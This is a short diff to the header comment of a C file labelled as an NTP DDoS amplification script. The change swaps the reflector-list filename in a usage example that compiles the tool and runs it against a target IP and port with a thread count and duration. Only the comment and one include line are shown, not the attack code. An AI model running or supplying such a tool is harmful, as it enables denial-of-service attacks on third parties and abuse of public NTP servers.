@@ -2,7 +2,7 @@
  *	NTP.c - NTP DDOS SCRIPT
  *
  *  $ gcc -o ntp NTP.c -pthread
- *  $ ./ntp 1.1.1.1 80 AmpList/ntp.txt 10 -1 60
+ *  $ ./ntp 1.1.1.1 80 AmpList/ntp.list 10 -1 60
  */
 
 #include <time.h>
